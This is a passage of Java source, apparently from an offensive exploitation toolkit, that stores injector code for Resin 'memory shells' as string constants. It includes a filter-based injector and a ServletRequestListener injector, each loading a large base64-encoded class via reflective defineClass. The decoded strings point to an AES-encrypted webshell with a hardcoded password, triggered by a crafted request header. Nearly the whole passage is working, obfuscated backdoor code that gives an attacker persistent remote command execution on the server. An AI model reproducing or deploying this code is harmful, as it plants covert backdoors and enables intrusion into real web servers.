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\";\n" +
            "            byte[] FilterClass = base64Decode(FilterBase64);\n" +
            "\n" +
            "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass1.setAccessible(true);\n" +
            "            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);\n" +
            "            Object filter_class = (Object) filterClass.newInstance();\n" +
            "\n" +
            "            Class filterConfigImplCls = classLoader.loadClass(\"com.caucho.server.dispatch.FilterConfigImpl\");\n" +
            "            Object filterConfigImpl = filterConfigImplCls.newInstance();\n" +
            "\n" +
            "            Method m1 = filterConfigImpl.getClass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
            "            m1.setAccessible(true);\n" +
            "            m1.invoke(filterConfigImpl, filterName);\n" +
            "\n" +
            "            Method m2 = filterConfigImpl.getClass().getDeclaredMethod(\"setFilterClass\", String.class);\n" +
            "            m2.setAccessible(true);\n" +
            "            m2.invoke(filterConfigImpl, filterName);\n" +
            "\n" +
            "            Method m3=filterConfigImpl.getClass().getDeclaredMethod(\"setFilter\", Filter.class);\n" +
            "            m3.setAccessible(true);\n" +
            "            m3.invoke(filterConfigImpl,filter_class);\n" +
            "\n" +
            "            // 4.X getClass | 3.X getClass().getSuperClass\n" +
            "            Method m4 = null;\n" +
            "            try {\n" +
            "                m4 = webapp.getClass().getDeclaredMethod(\"addFilter\", FilterConfigImplClass);\n" +
            "            } catch (Exception e) {\n" +
            "                m4 = webapp.getClass().getSuperclass().getDeclaredMethod(\"addFilter\", FilterConfigImplClass);\n" +
            "            }\n" +
            "            m4.invoke(webapp, filterConfigImpl);\n" +
            "\n" +
            "            Class filterMappingCls = classLoader.loadClass(\"com.caucho.server.dispatch.FilterMapping\");\n" +
            "            Object filterMapping = filterMappingCls.newInstance();\n" +
            "\n" +
            "            Method m5 = filterMapping.getClass().getDeclaredMethod(\"createUrlPattern\");\n" +
            "            m5.setAccessible(true);\n" +
            "            Object o5 = m5.invoke(filterMapping);\n" +
            "\n" +
            "            Method m6 = o5.getClass().getDeclaredMethod(\"addText\", String.class);\n" +
            "            m6.setAccessible(true);\n" +
            "            m6.invoke(o5, urlPattern);\n" +
            "\n" +
            "            Method m7 = filterMapping.getClass().getSuperclass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
            "            m7.setAccessible(true);\n" +
            "            m7.invoke(filterMapping, filterName);\n" +
            "\n" +
            "            Method m8 = filterMapping.getClass().getSuperclass().getDeclaredMethod(\"setServletContext\", ServletContext.class);\n" +
            "            m8.setAccessible(true);\n" +
            "            m8.invoke(filterMapping, webapp);\n" +
            "\n" +
            "            // 4.X getClass | 3.X getClass().getSuperClass\n" +
            "            Field f1 = null;\n" +
            "            try {\n" +
            "                f1 = webapp.getClass().getDeclaredField(\"_filterMapper\");\n" +
            "            } catch (Exception e) {\n" +
            "                f1 = webapp.getClass().getSuperclass().getDeclaredField(\"_filterMapper\");\n" +
            "            }\n" +
            "            f1.setAccessible(true);\n" +
            "            Object filterMapper = f1.get(webapp);\n" +
            "\n" +
            "            Field f2 = filterMapper.getClass().getDeclaredField(\"_filterMap\");\n" +
            "            f2.setAccessible(true);\n" +
            "            ArrayList filterMap = (ArrayList) f2.get(filterMapper);\n" +
            "\n" +
            "            filterMap.add(0, filterMapping);\n" +
            "\n" +
            "            f1.set(webapp, filterMapper);\n" +
            "\n" +
            "            // 4.X getClass | 3.X getClass().getSuperClass\n" +
            "            Field f3 = null;\n" +
            "            try {\n" +
            "                f3 = webapp.getClass().getDeclaredField(\"_loginFilterMapper\");\n" +
            "            } catch (Exception e) {\n" +
            "                f3 = webapp.getClass().getSuperclass().getDeclaredField(\"_loginFilterMapper\");\n" +
            "            }\n" +
            "            f3.setAccessible(true);\n" +
            "            Object loginFilterMapper = f3.get(webapp);\n" +
            "\n" +
            "            Field f4 = loginFilterMapper.getClass().getDeclaredField(\"_filterMap\");\n" +
            "            f4.setAccessible(true);\n" +
            "            ArrayList filterMap2 = (ArrayList) f4.get(loginFilterMapper);\n" +
            "\n" +
            "            filterMap2.add(0, filterMapping);\n" +
            "            f3.set(webapp, loginFilterMapper);\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "}\n";

    public static final String ResinListenerMemShell =
            "import javax.servlet.ServletRequestListener;\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class ResinListenerMemShell {\n" +
            "    static {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public ResinListenerMemShell() {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void Inject() {\n" +
            "        try {\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            Class servletInvocation = classLoader.loadClass(\"com.caucho.server.dispatch.ServletInvocation\");\n" +
            "\n" +
            "            Object contextRequest = servletInvocation.getMethod(\"getContextRequest\").invoke(null);\n" +
            "            Object webapp = contextRequest.getClass().getMethod(\"getWebApp\").invoke(contextRequest);\n" +
            "            String ListenerBase64 = \"yv66vgAAADMBiQoAaQDXCQBMANgJAEwA2QgA2gkATADbCADcCQBMAN0IAN4JAEwA3wcA4AoACgDXCgAKAOEKAAoA4goATADjCQBMAOQIAOUJAEwA5goAaQDnCgBpAOgIAOkKAOoA6wcA7AoAMQDtCgAWAO4KAOoA7woA6gDwBwDxCADyCgDzAPQKADEA9QoA8wD2BwD3CgDzAPgKACAA+QoAIAD6CgAxAPsIAPwKAC4A/QgA/gcAvwoALgD/BwDMCgEAAQEKADABAggBAwcBBAcAggcBBQcBBggBBwoALgEICAEJCAEKCAELCAEMCAENCgAuAQ4HAQ8KAC4BEAoAOgERCgESARMKARIBFAoBFQEWBwEXCgBMARgIARkLAEABGggBGwoAMQEcCwBAAR0LAEABHgoATAEfCgBMASAIASELASIBIwcBJAoALgElCgBMAOcKAEwBJgsBIgEnCAC+CwBAAScHASgKAFMA1woAMAEpCwBnASoKADEBKwoBLAEtCgAwAOIKAFMBLgoATAEvCgAxATAIATEIATIKABsBMwoALgE0BwE1CgBhANcKAGEBNgoAYQE3CgBMATgIATkHAToIATsHATwHAT0BAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAANQd2QBAARwYXRoAQADbWQ1AQACY3MBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHUxtZW1zaGVsbC9SZXNpbkxpc3RlbmVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwEkBwE+BwDxAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcBBgEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAR2YXI1AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAAFvAQABZgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAVjbGF6egcBPwcBBAcBDwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAA3JlcQEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQAScmVxdWVzdEluaXRpYWxpemVkAQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI5BwFABwEXBwE6BwFBAQAQZ2V0TWV0aG9kQnlDbGFzcwEAUShMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACm1ldGhvZE5hbWUBAApwYXJhbWV0ZXJzAQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsHAUIBAAZpbnZva2UBAEsoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAJvMQEAAWkBAAFJAQAHY2xhc3NlcwEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEABHZhcjcBAANvYmoBABNbTGphdmEvbGFuZy9PYmplY3Q7BwE1BwEFAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBAAR2YXI4AQAEdmFyMQEABHZhcjIBAApTb3VyY2VGaWxlAQAXUmVzaW5MaXN0ZW5lclNoZWxsLmphdmEMAHUAdgwAawBsDABtAG4BABAzYzZlMGI4YTljMTUyMjRhDABvAHABAARwQVMzDABxAHABABAvZmF2aWNvbmRlbW8uaWNvDAByAHABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBQwFEDAFFAUYMAHMAkAwAcwBwAQAFVVRGLTgMAHQAcAwAdQB8DAFHAUgBAANBRVMHAT4MAUkBSgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAUsBTAwAdQFNDAFOAU8MAVABUQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAVIMAUkBUwwBVAFVDAFWAVcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBWAFMDAB1AVkMAUUBWgwBWwFGAQAQamF2YS51dGlsLkJhc2U2NAwBXAFdAQAKZ2V0RW5jb2RlcgwBXgFfBwFCDADDAWAMAWEBYgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFjAWQBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBZQFmAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFnAWIMAHUBaAcBPwwBaQFqDAFrAWwHAUAMAW0BbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAM8A0AEAEFgtUmVxdWVzdGVkLVdpdGgMAW8AkAEADlhNTEhUVFBSZXF1ZXN0DAFwAXEMAXIBcwwBdACQDACeAJ8MAIMAhAEAEG1lbXNoZWxsLnBheWxvYWQHAUEMAXUBdgEAG21lbXNoZWxsL1Jlc2luTGlzdGVuZXJTaGVsbAwBdwF4DAB/AIAMAXkBegEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAF7AXwMAX0BfgwBfwGABwGBDAGCAWgMAYMBTAwAlACVDAF/AVoBAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAYQAdgwBhQFfAQATamF2YS91dGlsL0FycmF5TGlzdAwBhgF8DAGHAYgMALsAvAEACV9yZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAIX3JlcXVlc3QBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0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